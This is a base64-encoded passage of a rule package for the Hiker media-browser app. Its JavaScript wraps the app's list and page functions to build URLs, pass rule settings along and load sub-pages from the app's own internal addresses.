cmluZygoUUlOR19USVRMRSwgTVlfUEFSQU1TKSA9PiB7XFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvaGlqYWNrRW52P3J1bGU9JyArIFFJTkdfVElUTEUpKS5ydWxlKVxcbiAgICAgICAgICAgIHZhciB7IHJ1blByZVJ1bGUgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcbiAgICAgICAgICAgIHJ1blByZVJ1bGUob3JpUlVMRS5wcmVSdWxlKVxcbiAgICAgICAgfSwgUUlOR19USVRMRSwgeyB1cmw6IE1ZX1JVTEUudXJsLCBSVUxFOiBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZ2VuTXlSdWxlKCkpKSwgaXNJbmRleDogaXNJbmRleCB9KSArICc7JyArIHBhcmFtMC5zbGljZSgzKVxcbiAgICB9XFxuICAgIG1ldGhvZF9zZXRMYXN0Q2hhcHRlclJ1bGUuaW52b2tlKGphdmFDb250ZXh0LCBwYXJhbTApXFxufVxcbi8vIOWKqOaAgeaWsOWinuWHveaVsOWKq+aMgVxcbmFkZEl0ZW1BZnRlciA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xKSB7XFxuICAgIGlmIChBcnJheS5pc0FycmF5KHBhcmFtMSkpIHBhcmFtMSA9IHBhcmFtMS5tYXAoaGlqYWNrRWwpXFxuICAgIGVsc2UgcGFyYW0xID0gaGlqYWNrRWwocGFyYW0xKVxcbiAgICBtZXRob2RfYWRkSXRlbUFmdGVyLmludm9rZShqYXZhQ29udGV4dCwgcGFyYW0wLCBwYXJhbTEpXFxufVxcbmFkZEl0ZW1CZWZvcmUgPSBmdW5jdGlvbihwYXJhbTAsIHBhcmFtMSkge1xcbiAgICBpZiAoQXJyYXkuaXNBcnJheShwYXJhbTEpKSBwYXJhbTEgPSBwYXJhbTEubWFwKGhpamFja0VsKVxcbiAgICBlbHNlIHBhcmFtMSA9IGhpamFja0VsKHBhcmFtMSlcXG4gICAgbWV0aG9kX2FkZEl0ZW1CZWZvcmUuaW52b2tlKGphdmFDb250ZXh0LCBwYXJhbTAsIHBhcmFtMSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLlh73mlbDlt6XlhbdcIixcInBhdGhcIjpcImZ1bmNUb29sc1wiLFwicnVsZVwiOlwibGV0IHsgUUlOR19USVRMRSwgTVlfUlVMRSwgaXNJbmRleCB9ID0gJC5pbXBvcnRQYXJhbVxcbmlmICghTVlfUlVMRSkgTVlfUlVMRSA9IHt9XFxuXFxuZnVuY3Rpb24gcnVuQ29kZShydWxlKSB7XFxuICAgIHRyeSB7XFxuICAgICAgICBsZXQgW2lucHV0LCBjb2RlXSA9IHJ1bGUuc3BsaXQoJy5qczonKVxcbiAgICAgICAgcmV0dXJuIGNvZGUgPyBldmFsKGNvZGUpIDogcnVsZVxcbiAgICB9IGNhdGNoIChlKSB7IHJldHVybiBydWxlIH1cXG59XFxuLy8g6aaW6aG16ZO+5o6l5pu/5o2i5YiG57G7XFxuZnVuY3Rpb24gaW5kZXhVcmwocGFyYW0pIHtcXG4gICAgTVlfUlVMRSA9IEpTT04ucGFyc2UoYmFzZTY0RGVjb2RlKE1ZX1JVTEUpKVxcbiAgICBsZXQgcGFnZU51bSA9IHBhcnNlSW50KHBhcmFtLnNwbGl0KCcjIyMnKVsxXSksXFxuICAgICAgICB1cmwgPSBNWV9SVUxFLnVybCxcXG4gICAgICAgIHsgZnlBbGwsIHRhYkhlYWRlciB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvQ2xhc3NUYWI/cnVsZT0nICsgUUlOR19USVRMRSwgT2JqZWN0LmFzc2lnbih7IFFJTkdfVElUTEU6IFFJTkdfVElUTEUgfSwgTVlfUlVMRSkpXFxuXFxuICAgIHVybCA9IHRhYkhlYWRlci5zZXRVcmwoZnlBbGwgPyB1cmwucmVwbGFjZSgvZnlBbGwvZywgJyQke2Z5QWxsfScpIDogdXJsLnJlcGxhY2UoL2Z5KGNsYXNzfGFyZWF8eWVhcnxzb3J0KS9nLCAnJCR7ZnkkMX0nKSlcXG4gICAgdXJsID0gdXJsLnJlcGxhY2UoL2Z5cGFnZSg/OkAoLT9cXFxcZCspQCk/KD86XFxcXCooXFxcXGQrKUApPy9nLCAoXywgc3RhcnQsIHNwYWNlKSA9PiBwYXJzZUludChzdGFydCB8fCAwKSArIDEgKyAocGFnZU51bSAtIDEpICogcGFyc2VJbnQoc3BhY2UgfHwgMSkpXFxuICAgIHVybCA9IC9eKFtcXFxcc1xcXFxTXSo/KSg/OlxcXFxbZmlyc3RQYWdlPShbXFxcXHNcXFxcU10qPylcXFxcXSk/KD86KFxcXFwuanM6W1xcXFxzXFxcXFNdKj8pKT8kLy5leGVjKHVybClcXG4gICAgaWYgKHBhZ2VOdW0gPT0gMSAmJiB1cmxbMl0pIHVybFsxXSA9IHVybFsyXVxcbiAgICBpZiAodXJsWzNdICYmICF1cmxbMV0uaW5jbHVkZXMoJy5qczonKSkgdXJsWzFdICs9IHVybFszXVxcbiAgICByZXR1cm4gcnVuQ29kZSh1cmxbMV0pXFxufVxcblxcbmZ1bmN0aW9uIHBhcmFtSGFuZGxlKHVybFBhcmFtLCB1YSwgdXJsVG1wKSB7XFxuICAgIGxldCBjaGFyc2V0LCBwYXJhbVRtcFxcbiAgICB0cnkgeyAvLyDpk77mjqXnmoTnvJbnoIHjgIFVQeWSjFJlZmVyZXLlupTor6XmmK/pppblhYjnu6fmib/pppbpobXpk77mjqVcXG4gICAgICAgIFssICwgY2hhcnNldCwgcGFyYW1UbXBdID0gdXJsVG1wLnNwbGl0KCc7JylcXG4gICAgICAgIHBhcmFtVG1wID0gcGFyYW1UbXAubWF0Y2goL157KC4qKX0kLylbMV0uc3BsaXQoJyYmJylcXG4gICAgfSBjYXRjaCAoZSkgeyBwYXJhbVRtcCA9IFtdIH1cXG4gICAgbGV0IFVzZXJBZ2VudCA9IHBhcmFtVG1wLmZpbmQoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSksXFxuICAgICAgICBSZWZlcmVyID0gcGFyYW1UbXAuZmluZCgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKVxcbiAgICB1cmxQYXJhbVswXSA9IHVybFBhcmFtWzBdIHx8ICdHRVQnXFxuICAgIHVybFBhcmFtWzFdID0gdXJsUGFyYW1bMV0gfHwgY2hhcnNldCB8fCAnVVRGLTgnXFxuICAgIHRyeSB7XFxuICAgICAgICB1cmxQYXJhbVsyXSA9IHVybFBhcmFtWzJdLm1hdGNoKC9eeyguKil9JC8pWzFdLnNwbGl0KCcmJicpXFxuICAgIH0gY2F0Y2ggKGUpIHsgdXJsUGFyYW1bMl0gPSBbXSB9XFxuICAgIC8vIOa3u+WKoOWFqOWxgFVB5ZKM5LiK57qnUmVmZXJlclxcbiAgICBpZiAoIXVybFBhcmFtWzJdLnNvbWUoKHYpID0+IHYuc3RhcnRzV2l0aCgnVXNlci1BZ2VudEAnKSkpIHtcXG4gICAgICAgIGlmIChVc2VyQWdlbnQpIHVybFBhcmFtWzJdLnB1c2goVXNlckFnZW50KVxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ3BjJylcXG4gICAgICAgICAgICB1cmxQYXJhbVsyXS5wdXNoKCdVc2VyLUFnZW50QCcgKyBQQ19VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcPy8sICfvvJ/vvJ8nKSlcXG4gICAgICAgIGVsc2UgaWYgKHVhID09ICdtb2JpbGUnKVxcbiAgICAgICAgICAgIHVybFBhcmFtWzJdLnB1c2goJ1VzZXItQWdlbnRAJyArIE1PQklMRV9VQS5yZXBsYWNlKC87L2csICfvvJvvvJsnKS5yZXBsYWNlKC9cXFxcPy8sICfvvJ/vvJ8nKSlcXG4gICAgfVxcbiAgICBpZiAoUmVmZXJlciAmJiAhdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKSlcXG4gICAgICAgIHVybFBhcmFtWzJdLnB1c2goUmVmZXJlcilcXG4gICAgdXJsUGFyYW1bMl0gPSAneycgKyB1cmxQYXJhbVsyXS5qb2luKCcmJicpICsgJ30nXFxuICAgIHJldHVybiB1cmxQYXJhbS5qb2luKCc7JylcXG59XFxuLy8g6aKE5aSE55CG5bm25Yid5aeL5YyWY29uZmlnXFxuZnVuY3Rpb24gcnVuUHJlUnVsZShydWxlKSB7XFxuICAgIGlmICgodHlwZW9mIE1ZX1BBR0UgIT0gJ3VuZGVmaW5lZCcgJiYgIE1ZX1BBR0UgPT0gMSkgJiZcXG4gICAgICAgICAoaXNJbmRleCB8fCAhZ2V0TXlWYXIoJyRwcmVSdWxlXycgKyBNWV9SVUxFLnRpdGxlKSkpIHtcXG4gICAgICAgIGV2YWwocnVsZSlcXG4gICAgICAgIHB1dE15VmFyKCckcHJlUnVsZV8nICsgTVlfUlVMRS50aXRsZSwgJ1QnKVxcbiAgICB9XFxuICAgIGxldCBfY2ZnID0gZ2V0TXlWYXIoJ2luaXRDb25maWcnLCAne30nKVxcbiAgICBpZiAoX2NmZyAmJiBfY2ZnLmxlbmd0aCA+IDApIHtcXG4gICAgICAgIGNvbmZpZyA9IEpTT04ucGFyc2UoX2NmZylcXG4gICAgfVxcbn1cXG4vLyDmraPmlofop6PmnpDpgJrnlKjlj5jph49cXG5mdW5jdGlvbiBnZW5NeVJ1bGUoKSB7XFxuICAgIGxldCBSVUxFID0gT2JqZWN0LmFzc2lnbih7fSwgTVlfUlVMRSlcXG4gICAgZGVsZXRlIFJVTEUubGFzdF9jaGFwdGVyX3J1bGVcXG4gICAgZGVsZXRlIFJVTEUucHJlUnVsZVxcbiAgICBkZWxldGUgUlVMRS5wYWdlTGlzdFxcbiAgICBkZWxldGUgUlVMRS5wYWdlc1xcbiAgICByZXR1cm4gUlVMRVxcbn1cXG5cXG5mdW5jdGlvbiBnZW5FeFVybCh1cmwpIHtcXG4gICAgdXJsID0gdXJsLnNwbGl0KCc7JylcXG4gICAgcmV0dXJuIHVybC5zaGlmdCgpICsgJzsnICsgcGFyYW1IYW5kbGUodXJsLCBNWV9SVUxFLnVhLCBNWV9SVUxFLnVybClcXG59XFxuXFxuaGlqYWNrTGF6eVJ1bGUgPSAkLnRvU3RyaW5nKChRSU5HX1RJVExFLCBNWV9QQVJBTVMpID0+IHtcXG4gICAgaWYgKCFNWV9SVUxFKSBNWV9SVUxFID0ge31cXG4gICAgTVlfUEFSQU1TID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoTVlfUEFSQU1TKSlcXG4gICAgZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvaGlqYWNrRW52P3J1bGU9JyArIFFJTkdfVElUTEUpKS5ydWxlKVxcbiAgICB2YXIge1xcbiAgICAgICAgcGFyYW1IYW5kbGUsXFxuICAgICAgICBnZW5FeFVybCxcXG4gICAgICAgIGhpamFja0xhenlSdWxlLFxcbiAgICAgICAgaGlqYWNrRWxcXG4gICAgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcbn0sIFFJTkdfVElUTEUsIGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeSh7IHVybDogTVlfUlVMRS51cmwsIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShnZW5NeVJ1bGUoKSkpLCBpc0luZGV4OiBpc0luZGV4IH0pKSlcXG5cXG5mdW5jdGlvbiBoaWphY2tFbChlbCkge1xcbiAgICBpZighZWwgfHwgdHlwZW9mIGVsICE9ICdvYmplY3QnKSByZXR1cm5cXG4gICAgaWYgKCFlbC5leHRyYSkgZWwuZXh0cmEgPSB7fVxcbiAgICBlbC5jb2xfdHlwZSA9IGVsLmNvbF90eXBlIHx8IE1ZX1JVTEUuY29sX3R5cGVcXG4gICAgbGV0IE5PV19SVUxFID0gT2JqZWN0LmFzc2lnbihnZW5NeVJ1bGUoKSwgeyBwYXJhbXM6IGVsLmV4dHJhIH0pXFxuXFxuICAgIGlmICh0eXBlb2YgZWwudXJsICE9ICdzdHJpbmcnIHx8XFxuICAgICAgICBbJ3g1X3dlYnZpZXdfc2luZ2xlJywgJ2lucHV0J10uc29tZSgodikgPT4gZWwuY29sX3R5cGUgPT0gdikgfHxcXG4gICAgICAgIFsn5rW36ZiU6KeG55WMJywgJ2phdmFzY3JpcHQ6J10uc29tZSgodikgPT4gZWwudXJsLnN0YXJ0c1dpdGgodikpIHx8XFxuICAgICAgICBbJ3J1bGUnLCAncGljcycsICd0b2FzdCcsICdjb3B5JywgJ2VkaXRGaWxlJywgJ3g1JywgJ3g1V2ViVmlldycsICd4NVBsYXknLCAnd2ViJywgJ3g1UnVsZScsICd3ZWJSdWxlJyxcXG4gICAgICAgICAgICAnZG93bmxvYWQnLCAnc2hhcmUnLCAnZmlsZVNlbGVjdCcsICd2aWRlbyddLnNvbWUoKHYpID0+IGVsLnVybC5zdGFydHNXaXRoKHYgKyAnOi8vJykpKSB7XFxuICAgICAgICByZXR1cm4gZWxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuc3RhcnRzV2l0aCgnaW5wdXQ6Ly8nKSkge1xcbiAgICAgICAgbGV0IHBhcmEgPSBKU09OLnBhcnNlKGVsLnVybC5zbGljZSg4KSlcXG4gICAgICAgIGlmIChwYXJhLmpzKSBwYXJhLmpzID0gaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBwYXJhLmpzXFxuICAgICAgICBlbC51cmwgPSAnaW5wdXQ6Ly8nICsgSlNPTi5zdHJpbmdpZnkocGFyYSlcXG4gICAgICAgIHJldHVybiBlbFxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdjb25maXJtOi8vJykpIHtcXG4gICAgICAgIGxldCByZUluZGV4ID0gZWwudXJsLmluZGV4T2YoJy5qczonKVxcbiAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgZWwudXJsID0gZWwudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBlbC51cmwuc2xpY2UocmVJbmRleCArIDQpXFxuICAgICAgICByZXR1cm4gZWxcXG4gICAgfSBlbHNlIGlmIChlbC51cmwuc3RhcnRzV2l0aCgnc2VsZWN0Oi8vJykpIHtcXG4gICAgICAgIGxldCBwYXJhID0gSlNPTi5wYXJzZShlbC51cmwuc2xpY2UoOSkpXFxuICAgICAgICBpZiAocGFyYS5qcykgcGFyYS5qcyA9IGhpamFja0xhenlSdWxlICsgJzsnICsgcGFyYS5qc1xcbiAgICAgICAgZWwudXJsID0gJ3NlbGVjdDovLycgKyBKU09OLnN0cmluZ2lmeShwYXJhKVxcbiAgICAgICAgcmV0dXJuIGVsXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLmluY2x1ZGVzKCdAcnVsZT0nKSkge1xcbiAgICAgICAgbGV0IFtfLCB1cmwsIHJ1bGVdID0gZWwudXJsLm1hdGNoKC9eKFtcXFxcc1xcXFxTXSo/KUBydWxlPShbXFxcXHNcXFxcU10qKSQvKVxcbiAgICAgICAgZWwudXJsID0gdXJsXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gcnVsZVxcbiAgICAgICAgTk9XX1JVTEUuZGV0YWlsX2NvbF90eXBlID0gTVlfUlVMRS5jb2xfdHlwZVxcbiAgICB9IGVsc2UgaWYgKGVsLnVybC5zdGFydHNXaXRoKCdoaWtlcjovL3BhZ2UvJykpIHtcXG4gICAgICAgIGlmIChlbC51cmwuaW5jbHVkZXMoJ3J1bGU9JykgfHwgZWwuZXh0cmEucnVsZSlcXG4gICAgICAgICAgICByZXR1cm4gZWxcXG4gICAgICAgIGxldCBbXywgcGF0aCwgZmxhZywgcGFyYW1zXSA9IGVsLnVybC5tYXRjaCgvXmhpa2VyOlxcXFwvXFxcXC9wYWdlXFxcXC8oLis/KSgjLio/KT8oPzpcXFxcPyguKikpPyQvKSxcXG4gICAgICAgICAgICBzdWJQYWdlID0gTVlfUlVMRS5wYWdlTGlzdC5maW5kKCh2KSA9PiB2LnBhdGggPT0gcGF0aCksXFxuICAgICAgICAgICAgc3ViVXJsID0gKHBhcmFtcyB8fCAnJykuc3BsaXQoJyYnKS5maW5kKCh2KSA9PiB2LnN0YXJ0c1dpdGgoJ3VybD0nKSlcXG4gICAgICAgIGVsLnVybCA9IChzdWJVcmwgPyBzdWJVcmwuc2xpY2UoNCkucmVwbGFjZSgv77yf77yfL2csICc/JykucmVwbGFjZSgv77yG77yGL2csICcmJykgOiAoZWwuZXh0cmEgfHwge30pLnVybCkgfHwgJ2hpa2VyOi8vZW1wdHknICsgZmxhZyArICc/JyArIChwYXJhbXMgfHwgJycpXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfZmluZF9ydWxlID0gc3ViUGFnZS5ydWxlXFxuICAgICAgICBOT1dfUlVMRS5kZXRhaWxfY29sX3R5cGUgPSBzdWJQYWdlLmNvbF90eXBlXFxuICAgIH0gZWxzZSBpZiAoZWwudXJsLmluY2x1ZGVzKCdAbGF6eVJ1bGU9JykpIHtcXG4gICAgICAgIGxldCByZUluZGV4ID0gZWwudXJsLmluZGV4T2YoJy5qczonKVxcbiAgICAgICAgaWYgKHJlSW5kZXggPj0gMCkgZWwudXJsID0gZWwudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyBlbC51cmwuc2xpY2UocmVJbmRleCArIDQpXFxuICAgICAgICByZXR1cm4gZWxcXG4gICAgfSBlbHNlIGlmIChpc0luZGV4KSB7XFxuICAgICAgICBpZiAoIU1ZX1JVTEUuZGV0YWlsX2ZpbmRfcnVsZSB8fCAvaGlrZXI6XFxcXC9cXFxcLyg/IWVtcHR5LiskKS8udGVzdChlbC51cmwpKSByZXR1cm4gZWxcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiBlbFxcbiAgICB9XFxuICAgIGVsLmV4dHJhID0gT2JqZWN0LmFzc2lnbih7fSwgZWwuZXh0cmEsIHtcXG4gICAgICAgIHVybDogZ2VuRXhVcmwoZWwudXJsKSxcXG4gICAgICAgIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShOT1dfUlVMRSkpLFxcbiAgICAgICAgcGFnZVRpdGxlOiBpc0luZGV4ICYmIGVsLnRpdGxlXFxuICAgIH0pXFxuICAgIGVsLnVybCA9ICdoaWtlcjovL3BhZ2UvZnJhbWVMb2FkP3J1bGU9JyArIFFJTkdfVElUTEVcXG4gICAgcmV0dXJuIGVsXFxufVxcbiQuZXhwb3J0cyA9IHtcXG4gICAgcnVuQ29kZTogcnVuQ29kZSxcXG4gICAgaW5kZXhVcmw6IGluZGV4VXJsLFxcbiAgICBwYXJhbUhhbmRsZTogcGFyYW1IYW5kbGUsXFxuICAgIHJ1blByZVJ1bGU6IHJ1blByZVJ1bGUsXFxuICAgIGdlbk15UnVsZTogZ2VuTXlSdWxlLFxcbiAgICBnZW5FeFVybDogZ2VuRXhVcmwsXFxuICAgIGhpamFja0xhenlSdWxlOiBoaWphY2tMYXp5UnVsZSxcXG4gICAgaGlqYWNrRWw6IGhpamFja0VsXFxufVxcblwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6aG16Z2i6L295YWlXCIsXCJwYXRoXCI6XCJmcmFtZUxvYWRcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IFFJTkdfVElUTEUgPSBnZXRNeVZhcignbXlDb2xsZWN0aW9uJylcXG52YXIgbXlDb2xsX2VsID0gW11cXG5ldmFsKEpTT04ucGFyc2UoZmV0Y2goJ2hpa2VyOi8vcGFnZS9oaWphY2tFbnY/cnVsZT0nICsgUUlOR19USVRMRSkpLnJ1bGUpXFxuXFxuaWYgKCFpc0luZGV4KSB7XFxuICAgIGlmIChwYWdlVGl0bGUpIHNldFBhZ2VUaXRsZShwYWdlVGl0bGUpXFxuICAgIHNldExhc3RDaGFwdGVyUnVsZShvcmlSVUxFLmxhc3RfY2hhcHRlcl9ydWxlKVxcbiAgICBNWV9QQVJBTVMgPSBNWV9SVUxFLnBhcmFtc1xcbn0gZWxzZSBpZiAoTVlfUEFHRSA9PSAxKSB7XFxuICAgIHRhYkhlYWRlci5sb2FkKG15Q29sbF9lbClcXG4gICAgaWYgKFJVTEUuc2VhcmNoX3VybCkgbXlDb2xsX2VsLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLmkJzntKJcXFwiLFxcbiAgICAgICAgZGVzYzogXFxcIui/meaYr+mYheWKqOa8q+eahOaQnOe0ouWTpn5+XFxcIixcXG4gICAgICAgIHVybDogJ1xcXCJoaWtlcjovL3NlYXJjaD9zPVxcXCIraW5wdXQnLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBydWxlczogJC50b1N0cmluZygoUUlOR19USVRMRSwgdGl0bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1bGVzID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRSlcXG4gICAgICAgICAgICAgICAgcnVsZXMgPSBbcnVsZXMuZmluZCgodikgPT4gdi50aXRsZSA9PSB0aXRsZSldXFxuICAgICAgICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShydWxlcylcXG4gICAgICAgICAgICB9LCBRSU5HX1RJVExFLCBSVUxFLnRpdGxlKSxcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKCdzZWFyY2hLZXknLCAnJyksXFxuICAgICAgICAgICAgb25DaGFuZ2U6IFxcXCJwdXRNeVZhcignc2VhcmNoS2V5JyxpbnB1dClcXFwiXFxuICAgICAgICB9LFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgIH0pXFxufVxcbi8vIOato+aWh+ino+aekFxcbnZhciB7XFxuICAgIHBhcmFtSGFuZGxlLFxcbiAgICBydW5QcmVSdWxlLFxcbiAgICBnZW5FeFVybCxcXG4gICAgaGlqYWNrTGF6eVJ1bGVcXG59ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUpXFxucnVuUHJlUnVsZShvcmlSVUxFLnByZVJ1bGUpXFxuaWYgKE1ZX1JVTEUuZmluZF9ydWxlLnN0YXJ0c1dpdGgoJ2pzOicpKSB7XFxuICAgIGxldCB7IGhpamFja0VsIH0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSlcXG4gICAgc2V0UmVzdWx0ID0gZnVuY3Rpb24ocGFyYW0wLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zKSB7XFxuICAgICAgICBwYXJhbTEgPSBDQUxMQkFDS19LRVlcXG4gICAgICAgIHBhcmFtMiA9IE1ZX1JVTEVcXG4gICAgICAgIHBhcmFtMyA9IE1ZX1RZUEVcXG4gICAgICAgIGlmIChBcnJheS5pc0FycmF5KHBhcmFtMC5kYXRhKSkgcGFyYW0wID0gcGFyYW0wLmRhdGFcXG4gICAgICAgIEFycmF5LnByb3RvdHlwZS5wdXNoLmFwcGx5KG15Q29sbF9lbCwgcGFyYW0wLm1hcChoaWphY2tFbCkpXFxuICAgICAgICBtZXRob2Rfc2V0UmVzdWx0Lmludm9rZShqYXZhQ29udGV4dCwgbXlDb2xsX2VsLCBwYXJhbTEsIHBhcmFtMiwgcGFyYW0zKVxcbiAgICB9XFxuICAgIHNldEhvbWVSZXN1bHQgPSBzZXRSZXN1bHRcXG4gICAgc2V0U2VhcmNoUmVzdWx0ID0gc2V0UmVzdWx0XFxuXFxuICAgIGV2YWwoTVlfUlVMRS5maW5kX3J1bGUuc2xpY2UoMykpXFxufSBlbHNlIHtcXG4gICAgbGV0IHsgcnVuQ29kZSB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUpLFxcbiAgICAgICAgW18sIGZpbmRSdWxlLCBkZXRhaWxGaW5kUnVsZV0gPSBNWV9SVUxFLmZpbmRfcnVsZS5tYXRjaCgvXihbXFxcXHNcXFxcU10qPykoPzo9PT4oW1xcXFxzXFxcXFNdKikpPyQvKVxcbiAgICBmaW5kUnVsZSA9IGZpbmRSdWxlLnNwbGl0KCc7JylcXG4gICAgcGFyc2VEb21Gb3JBcnJheShnZXRSZXNDb2RlKCksIGZpbmRSdWxlLnNoaWZ0KCkpLmZvckVhY2goKGRhdGEpID0+IHtcXG4gICAgICAgIGxldCBbdGl0bGUsIGltZywgZGVzYywgdXJsXSA9IGZpbmRSdWxlLm1hcCgodiwgaSkgPT4ge1xcbiAgICAgICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICAgICAgaWYgKHYgPT0gJyonKSByZXR1cm4gJydcXG4gICAgICAgICAgICAgICAgICAgIGVsc2UgdiA9IChpID09IDEgfHwgaSA9PSAzKSA/XFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VEb20oZGF0YSwgdikgOlxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlRG9tRm9ySHRtbChkYXRhLCB2KVxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGkgIT0gMykgdiA9IHJ1bkNvZGUodilcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB2XFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsgcmV0dXJuICcnIH1cXG4gICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICByZXMgPSB7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSwgdXJsOiB1cmwsXFxuICAgICAgICAgICAgICAgIGRlc2M6IGRlc2MsIGltZzogaW1nLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogTVlfUlVMRS5jb2xfdHlwZVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIGlmIChyZXMudXJsKSB7XFxuICAgICAgICAgICAgaWYgKHJlcy51cmwuaW5jbHVkZXMoJ0BsYXp5UnVsZT0nKSkge1xcbiAgICAgICAgICAgICAgICBsZXQgcmVJbmRleCA9IHJlcy51cmwuaW5kZXhPZignLmpzOicpXFxuICAgICAgICAgICAgICAgIGlmIChyZUluZGV4ID49IDApIHJlcy51cmwgPSByZXMudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyByZXMudXJsLnNsaWNlKHJlSW5kZXggKyA0KVxcbiAgICAgICAgICAgIH0gZWxzZSAgaWYgKGRldGFpbEZpbmRSdWxlKSB7XFxuICAgICAgICAgICAgICAgIHJlcy5leHRyYSA9IHtcXG4gICAgICAgICAgICAgICAgICAgIHVybDogZ2VuRXhVcmwodXJsKSxcXG4gICAgICAgICAgICAgICAgICAgIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShPYmplY3QuYXNzaWduKGdlbk15UnVsZSgpLCB7IGRldGFpbF9maW5kX3J1bGU6IGRldGFpbEZpbmRSdWxlIH0pKSksXFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IGlzSW5kZXggJiYgdGl0bGVcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICByZXMudXJsID0gJ2hpa2VyOi8vcGFnZS9mcmFtZUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRVxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoTVlfUlVMRS5kZXRhaWxfZmluZF9ydWxlKSB7XFxuICAgICAgICAgICAgICAgIHJlcy5leHRyYSA9IHtcXG4gICAgICAgICAgICAgICAgICAgIHVybDogZ2VuRXhVcmwodXJsKSxcXG4gICAgICAgICAgICAgICAgICAgIFJVTEU6IGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShnZW5NeVJ1bGUoKSkpLFxcbiAgICAgICAgICAgICAgICAgICAgcGFnZVRpdGxlOiBpc0luZGV4ICYmIHRpdGxlXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgcmVzLnVybCA9ICdoaWtlcjovL3BhZ2UvZnJhbWVMb2FkP3J1bGU9JyArIFFJTkdfVElUTEVcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICBteUNvbGxfZWwucHVzaChyZXMpXFxuICAgIH0pXFxuICAgIHNldFJlc3VsdChteUNvbGxfZWwpXFxufVxcblwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pu05paw6K+m5oOFXCIsXCJwYXRoXCI6XCJVcFwiLFwicnVsZVwiOlwianM6XFxudmFyIHJlcyA9IHt9O1xcbnZhciBpdGVtcyA9IFtdO1xcbnZhciBpbWcgPSAnaHR0cHM6Ly9iaW5nLmltZy5ydW4vMTM2Nng3NjgucGhwJztcXG5pdGVtcy5wdXNoKHtcXG4gICAgaW1nOiBpbWcsXFxuICAgIHVybDogaW1nICsgXFxcIiMuanBnXFxcIixcXG4gICAgZGVzYzogJzAnLFxc